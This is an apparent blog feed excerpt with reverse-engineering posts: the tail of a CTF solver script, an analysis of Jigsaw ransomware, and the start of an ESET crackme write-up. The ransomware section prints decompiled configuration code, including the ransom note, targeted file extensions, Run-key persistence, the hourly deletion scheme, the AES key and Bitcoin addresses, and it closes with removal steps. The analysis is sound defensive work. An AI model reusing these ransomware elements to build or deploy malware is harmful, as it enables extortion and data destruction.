                &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;raise&lt;/span&gt; Z3Exception(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;arrays and uninterpreted sorts are not supported&amp;#39;&lt;/span&gt;)
            block.append(c != m[d])
        s.add(Or(block))

&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;check&lt;/span&gt;(ans):
    l = [&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;WeirD&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;Weird&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;CppClr&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;Jit&amp;#39;&lt;/span&gt;]
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#24909d&#34;&gt;any&lt;/span&gt;(i &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; ans &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; l)

&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; m &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; get_models(g, &lt;span style=&#34;color:#3677a9&#34;&gt;1337&lt;/span&gt;):
    fuck = []
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; j, i &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#24909d&#34;&gt;enumerate&lt;/span&gt;(flag):
        fuck.append(m[i].as_long())
    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# print &amp;#34; &amp;#34;.join(&amp;#34;%02x&amp;#34; % i for i in fuck)&lt;/span&gt;
    x = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;.join(fuckingBase[i] &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; fuck)
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; check(x):
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;print&lt;/span&gt; x
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Which prints the flag - &lt;code&gt;CTF{CppClrIsWeirdButReallyFun}&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;my-mistakes&#34;&gt;My Mistakes&amp;hellip;&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;Failed to notice the RVA pointed out by dnSpy for unmanaged functions.&lt;/li&gt;
&lt;li&gt;Failed to recognize that the transition from unmanaged to managed code is done by using metadata tokens.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;If I knew these, the challenge could be solved in one hour, 30 mins max.&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Analysing Jigsaw Ransomware</title>
        <link>http://localhost:1313/post/analysing-jigsaw-ransomware/</link>
        <pubDate>Wed, 01 Jan 2020 00:00:00 +0530</pubDate>
        
        <guid>http://localhost:1313/post/analysing-jigsaw-ransomware/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;SHA1: 27d99fbca067f478bb91cdbcb92f13a828b00859&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Today I&amp;rsquo;ll be analyzing Jigsaw Ransomware.&lt;br&gt;
Running detect-it-easy, we get&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/jigsaw-ransomware/i0.PNG&#34; alt=&#34;i0&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;So the binary is packed using ConfuserEx, an open source obfuscator.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s unpack the binary first.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/jigsaw-ransomware/i1.PNG&#34; alt=&#34;i1&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Place a breakpoint after the first call at &lt;code&gt;Module::.cctor&lt;/code&gt;, execute it and when the control hits the breakpoint, dump the module from the modules window.&lt;/p&gt;
&lt;p&gt;Open it in dnSpy, and nop out the first call by selecting &lt;code&gt;Edit IL Instructions&lt;/code&gt; and change the first instruction to &lt;code&gt;nop&lt;/code&gt; and save the module.&lt;/p&gt;
&lt;p&gt;Perform the same operations for the second call before &lt;code&gt;AssemblyLoader.Attach&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/jigsaw-ransomware/i2.PNG&#34; alt=&#34;i2&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;The module named &lt;code&gt;&amp;lt;unknown&amp;gt;&lt;/code&gt; contains the resources. It&amp;rsquo;s a DLL module (&lt;code&gt;QbZlczhiHcyXUZulvpHjfBbHhhxY.dll&lt;/code&gt;).&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    0x00000410: ExtensionsToEncrypt‎ = &amp;quot;.jpg .jpeg .raw .tif .gif .png .bmp\r\n.3dm .max\r\n.accdb .db .dbf .mdb .pdb .sql\r\n.dwg .dxf\r\n.c .cpp .cs .h .php .asp .rb .java .jar .class .py .js\r\n.aaf .aep .aepx .plb .prel .prproj .aet .ppj .psd .indd .indl .indt .indb .inx .idml .pmd .xqx .xqx .ai .eps .ps .svg .swf .fla .as3 .as\r\n.txt .doc .dot .docx .docm .dotx .dotm .docb .rtf .wpd .wps .msg .pdf .xls .xlt .xlm .xlsx .xlsm .xltx .xltm .xlsb .xla .xlam .xll .xlw .ppt .pot .pps .pptx .pptm .potx .potm .ppam .ppsx .ppsm .sldx .sldm\r\n.wav .mp3 .aif .iff .m3u .m4u .mid .mpa .wma .ra .avi .mov .mp4 .3gp .mpeg .3g2 .asf .asx .flv .mpg .wmv .vob .m3u8\r\n.dat .csv .efx .sdf .vcf .xml .ses\r\n.Qbw .QBB .QBM .QBI .QBR  \r\n.Cnt .Des .v30 .Qbo .Ini .Lgb .Qwc .Qbp .Aif .Qba .Tlg .Qbx .Qby  \r\n.1pa .Qpd .Txt .Set .Iif  \r\n.Nd .Rtp .Tlg .Wav .Qsm .Qss .Qst .Fx0 .Fx1 .Mx0 .FPx .Fxr .Fim .ptb .Ai .Pfb .Cgn .Vsd .Cdr .Cmx .Cpt .Csl .Cur .Des .Dsf .Ds4\r\n .Drw .Dwg.Eps .Ps .Prn .Gif .Pcd .Pct .Pcx .Plt .Rif .Svg .Swf .Tga .Tiff .Psp .Ttf .Wpd .Wpg .Wi .Raw .Wmf .Txt .Cal .Cpx .Shw .Clk .Cdx .Cdt .Fpx .Fmv .Img .Gem .Xcf .Pic .Mac .Met \r\n.PP4 .Pp5 .Ppf .Xls .Xlsx .Xlsm .Ppt .Nap .Pat .Ps .Prn .Sct .Vsd .wk3 .wk4 .XPM .zip .rar  \r\n&amp;quot;

    0x00000864: Jigsaw = [System.Drawing.Bitmap] : A clown

    0x00006FE0: StartModeDebug‎ = &amp;quot;I&#39;m running in Debug mode&amp;quot;

    0x00006FFB: vanityAddresses‎ = &amp;quot;1L9GdBW65Rt6e8UY69bnWNWomsppFFFR2X\r\n13VEVaJUMdJyQ7ttPfBaVNKjj2dS9ahU1z\r\n15fbyNgDnqYQR5vSHJ8PTAEJbKy4dwNBCZ\r\n1Q5B5udzDLpNJbpedGpyGMLVU5DR5dTqx6\r\n18hxbo2Rcp7zmWNsVryFrfZiLGajByWSG1&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Opening the new module in dnSpy, and renaming the functions, we get&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/jigsaw-ransomware/i3.PNG&#34; alt=&#34;i3&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;The class &lt;code&gt;Main.Config&lt;/code&gt; contains the static data&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cs&#34; data-lang=&#34;cs&#34;&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;static&lt;/span&gt; Config()
    {
        &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// Appdata/Roaming
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;string&lt;/span&gt; path = Config.Environment_GetFolderPath(Environment.SpecialFolder.ApplicationData);
        &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// Appdata/Local
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;string&lt;/span&gt; path2 = Config.Environment_GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        Config.StartMode = Config.StartModeType.ErrorMessage;
        &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/*
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;         If current-date &amp;gt; ActiveAfterDateTime {
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;            // Encrypt Files
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;         }
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;         */&lt;/span&gt;
        Config.ActiveAfterDateTime = &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;new&lt;/span&gt; DateTime(&lt;span style=&#34;color:#3677a9&#34;&gt;2016&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;);
        &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// Info Message
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        Config.ErrorMessage = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Congratulations. Your software has been registered. Confirmation code 994759&amp;#34;&lt;/span&gt; + Environment.NewLine + &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Email us this code in the chat to active your software. It can take up to 48 hours.&amp;#34;&lt;/span&gt;;
        Config.ErrorTitle = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Thank you&amp;#34;&lt;/span&gt;;
        &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// Create Entry in &amp;#34;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        Config.StartupMethod = Windows.StartupMethodType.Registry;
        Config.TempExeRelativePath = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Drpbx\\drpbx.exe&amp;#34;&lt;/span&gt;;
        Config.FinalExeRelativePath = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Frfx\\firefox.exe&amp;#34;&lt;/span&gt;;
        Config.FinalExePath = Path.Combine(path, Config.FinalExeRelativePath);
        Config.TempExePath = Path.Combine(path2, Config.TempExeRelativePath);
        Config.WorkFolderRelativePath = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;System32Work\\&amp;#34;&lt;/span&gt;;
        Config.WorkFolderPath = Path.Combine(path, Config.WorkFolderRelativePath);
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (!Directory.Exists(Config.WorkFolderPath))
        {
            Directory.CreateDirectory(Config.WorkFolderPath);
        }
        Config.OnlyRunAfterSysRestart = &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;false&lt;/span&gt;;
        Config.WelcomeMessage = &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;string&lt;/span&gt;.Concat(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;string&lt;/span&gt;[]
        {
            &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Your computer files have been encrypted. Your photos, videos, documents, etc....&amp;#34;&lt;/span&gt;,
            Environment.NewLine,
            &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;But, don&amp;#39;t worry! I have not deleted them, yet.&amp;#34;&lt;/span&gt;,
            Environment.NewLine,
            &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;You have 24 hours to pay 150 USD in Bitcoins to get the decryption key.&amp;#34;&lt;/span&gt;,
            Environment.NewLine,
            &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Every hour files will be deleted. Increasing in amount every time.&amp;#34;&lt;/span&gt;,
            Environment.NewLine,
            &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;After 72 hours all that are left will be deleted.&amp;#34;&lt;/span&gt;,
            Environment.NewLine,
            Environment.NewLine,
            &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;If you do not have bitcoins Google the website localbitcoins.&amp;#34;&lt;/span&gt;,
            Environment.NewLine,
            &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Purchase 150 American Dollars worth of Bitcoins or .4 BTC. The system will accept either one.&amp;#34;&lt;/span&gt;,
            Environment.NewLine,
            &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Send to the Bitcoins address specified.&amp;#34;&lt;/span&gt;,
            Environment.NewLine,
            &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Within two minutes of receiving your payment your computer will receive the decryption key and return to normal.&amp;#34;&lt;/span&gt;,
            Environment.NewLine,
            &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Try anything funny and the computer has several safety measures to delete your files.&amp;#34;&lt;/span&gt;,
            Environment.NewLine,
            &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;As soon as the payment is received the crypted files will be returned to normal.&amp;#34;&lt;/span&gt;,
            Environment.NewLine,
            Environment.NewLine,
            &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;       Thank you        &amp;#34;&lt;/span&gt;
        });
        &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// Ransom Amount
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        Config.RansomUsd = &lt;span style=&#34;color:#3677a9&#34;&gt;150&lt;/span&gt;;
        Config.TaskMessage = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Please, send $&amp;#34;&lt;/span&gt; + Config.RansomUsd + &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34; worth of Bitcoin here:&amp;#34;&lt;/span&gt;;

        &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// ...
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;
        &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// Token: 0x04000033 RID: 51
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;internal&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;string&lt;/span&gt; EncryptionFileExtension = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;.fun&amp;#34;&lt;/span&gt;;

        &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// Token: 0x04000034 RID: 52
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;internal&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; MaxFilesizeToEncryptInBytes = &lt;span style=&#34;color:#3677a9&#34;&gt;10000000&lt;/span&gt;;

        &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// Token: 0x04000035 RID: 53
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// AES Key
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;internal&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;string&lt;/span&gt; EncryptionPassword = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;OoIsAwwF23cICQoLDA0ODe==&amp;#34;&lt;/span&gt;;
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Nothing to discuss as the names are self-explanatory. Later we&amp;rsquo;ll see that the ransomware is copied into two locations:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;AppData\Local\Drpbx\drpbx.exe&lt;/li&gt;
&lt;li&gt;AppData\Roaming\Frfx\firefox.exe&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;In &lt;code&gt;Hacking.InitSoftware&lt;/code&gt;, we have&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/jigsaw-ransomware/i4.PNG&#34; alt=&#34;i4&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;If &lt;code&gt;Main()&lt;/code&gt; has been called with exactly one argument, it displays a message-box with the text &lt;code&gt;Config.ErrorMessage&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Next, it copies itself to startup directory and to the registry key &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;And after copying itself into &lt;code&gt;Appdata\Roaming\Frfx&lt;/code&gt; and &lt;code&gt;AppData\Local\Drpbx&lt;/code&gt; folders using &lt;code&gt;Hacking.ExeSmartCopy&lt;/code&gt;, it restarts itself as &lt;code&gt;drpbx.exe&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/jigsaw-ransomware/i5.PNG&#34; alt=&#34;i5&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;timerActivateChecker_Tick&lt;/code&gt; is executed every 6 seconds. But the flag &lt;code&gt;Config.Activated&lt;/code&gt; restricts its execution frequency to once.&lt;/p&gt;
&lt;p&gt;If the current date is greater than &lt;code&gt;01-04-2016&lt;/code&gt;, encrypt all the files and show the form &lt;code&gt;FormGame&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The list of file types to encrypt are specified by &lt;code&gt;Resources.ExtensionsToEncrypt‎&lt;/code&gt;. The extensions are separated by &lt;code&gt;CrLf&lt;/code&gt; and spaces.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;Locker.EncryptFileSystem&lt;/code&gt; recursively encrypts the files and stores the names of the encrypted files in &lt;code&gt;AppData\Roaming\System32Work\EncryptedFileList.txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Only the files whose size is less than &lt;code&gt;10**7&lt;/code&gt; are encrypted.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/jigsaw-ransomware/i6.PNG&#34; alt=&#34;i6&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;The files are encrypted using AES with the key - &lt;code&gt;OoIsAwwF23cICQoLDA0ODe==&lt;/code&gt; and the IV - &lt;code&gt;AAEAAwUDAAEAAAIABgcGAA==&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/jigsaw-ransomware/i7.PNG&#34; alt=&#34;i7&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;After encrypting the files, the form &lt;code&gt;FormGame&lt;/code&gt; is displayed.&lt;br&gt;
It displays a ransom message &lt;code&gt;Config.WelcomeMessage&lt;/code&gt; and&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/jigsaw-ransomware/i8.PNG&#34; alt=&#34;i8&#34;  /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cs&#34; data-lang=&#34;cs&#34;&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;string&lt;/span&gt; GetBitcoinAddess()
    {
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;string&lt;/span&gt; text = FormGame.Path_Combine(Config.WorkFolderPath, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Address.txt&amp;#34;&lt;/span&gt;);
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (FormGame.File_Exists(text))
        {
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; FormGame.File_ReadAllText(text);
        }
        HashSet&amp;lt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;string&lt;/span&gt;&amp;gt; hashSet = &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;new&lt;/span&gt; HashSet&amp;lt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;string&lt;/span&gt;&amp;gt;();
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;foreach&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;string&lt;/span&gt; text2 &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; FormGame.StrSplit(Resources.vanityAddresses, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;string&lt;/span&gt;[]
        {
            FormGame.NewLine()
        }, StringSplitOptions.RemoveEmptyEntries).ToList&amp;lt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;string&lt;/span&gt;&amp;gt;())
        {
            hashSet.Add(FormGame.StrTrim(text2));
        }
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;string&lt;/span&gt; text3 = Enumerable.OrderBy&amp;lt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;string&lt;/span&gt;, Guid&amp;gt;(hashSet, (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;string&lt;/span&gt; x) =&amp;gt; Guid.NewGuid()).FirstOrDefault&amp;lt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;string&lt;/span&gt;&amp;gt;();
        FormGame.File_WriteAllText(text, text3);
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; text3;
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;GetBitcoinAddess&lt;/code&gt; fetches a random bitcoin from &lt;code&gt;Appdata\Roaming\System32Work\Address.txt&lt;/code&gt;. The randomization is due to &lt;code&gt;Guid.NewGuid()&lt;/code&gt;&lt;br&gt;
The default list of bitcoin addresses are stored in the resource &lt;code&gt;Resources.vanityAddresses‎&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;DidRun&lt;/code&gt; checks if the app ran atleast once. If so, it deletes 1000 encrypted files.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/jigsaw-ransomware/i9.PNG&#34; alt=&#34;i9&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;If the amount paid is atleast 150 USD, the timer stops. It then decrypts the encrypted files and removes itself (by executing a batch script).&lt;/p&gt;
&lt;p&gt;After every hour, &lt;code&gt;N&lt;/code&gt; files are deleted.  &lt;code&gt;N&lt;/code&gt; is computed using&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;N&lt;/span&gt;() {
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; n = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;;
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt;) pow(&lt;span style=&#34;color:#3677a9&#34;&gt;1.1&lt;/span&gt;, n++);
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The bitcoin transactions use the &lt;code&gt;blockr api&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/jigsaw-ransomware/i10.PNG&#34; alt=&#34;i10&#34;  /&gt;&lt;/p&gt;
&lt;h2 id=&#34;removal&#34;&gt;Removal&lt;/h2&gt;
&lt;p&gt;The file &lt;code&gt;AppData\Roaming\System32Work\dr&lt;/code&gt; must be &lt;strong&gt;DELETED&lt;/strong&gt; &lt;strong&gt;within one hour&lt;/strong&gt; after the malware executes to prevent deletion of files.&lt;br&gt;
Iterate through the files present in &lt;code&gt;AppData\Roaming\System32Work\EncryptedFileList.txt&lt;/code&gt; and decrypt the files using the AES Key - &lt;code&gt;OoIsAwwF23cICQoLDA0ODe==&lt;/code&gt; and IV - &lt;code&gt;AAEAAwUDAAEAAAIABgcGAA==&lt;/code&gt;.&lt;br&gt;
The malware binaries can be removed by deleting the files&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;Appdata\Roaming\Frfx\firefox.exe&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;AppData\Local\Drpbx\drpbx.exe&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;The file &lt;code&gt;firefox.exe&lt;/code&gt; in the startup folder&lt;/li&gt;
&lt;li&gt;The registry entry named &lt;code&gt;firefox.exe&lt;/code&gt; in &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;</description>
        </item>
        <item>
        <title>ESET Crackme Challenge</title>
        <link>http://localhost:1313/post/eset-crackme-challenge/</link>
        <pubDate>Sat, 16 Nov 2019 00:00:00 +0000</pubDate>
        
        <guid>http://localhost:1313/post/eset-crackme-challenge/</guid>
        <description>&lt;p&gt;While searching the internet for good crackmes, I found this one!&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://join.eset.com/en/challenges/crack-me&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;ESET Crackme&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;I first tried to solve it in 2018. Out of 3 passwords, I could only find two! The second time I tried was on October 19, 2019. This time I could solve it completely.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s dive into it :-)&lt;/p&gt;
&lt;h1 id=&#34;task-1&#34;&gt;Task-1&lt;/h1&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:004013F6                 call    ds:IsDebuggerPresent
.text:004013FC                 test    eax, eax
.text:004013FE                 jz      short loc_401408
.text:00401400                 push    0               ; uExitCode
.text:00401402                 call    ds:ExitProcess
.text:00401408 ; ---------------------------------------------------------------------------
.text:00401408
.text:00401408 loc_401408:                             ; CODE XREF: _main+E↑j
.text:00401408                 mov     [ebp+NumberOfCharsWritten], 0
.text:0040140F                 push    3
.text:00401411                 push    25h
.text:00401413                 push    1Fh
.text:00401415                 push    offset aPleaseEnterVal ; &amp;quot;Please enter valid password : &amp;quot;
.text:0040141A                 call    EncodeDecode
.text:0040141F                 push    0               ; lpReserved
.text:00401421                 lea     eax, [ebp+NumberOfCharsWritten]
.text:00401424                 push    eax             ; lpNumberOfCharsWritten
.text:00401425                 push    offset aPleaseEnterVal ; &amp;quot;Please enter valid password : &amp;quot;
.text:0040142A                 call    _strlen
.text:0040142F                 add     esp, 4
.text:00401432                 push    eax             ; nNumberOfCharsToWrite
.text:00401433                 push    offset aPleaseEnterVal ; lpBuffer
.text:00401438                 mov     ecx, hConsoleOutput
.text:0040143E                 push    ecx             ; hConsoleOutput
.text:0040143F                 call    ds:WriteConsoleA
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;EncodeDecode&lt;/strong&gt; is a simple xor encoding. A small IDA script can save the time :-)&lt;/p&gt;
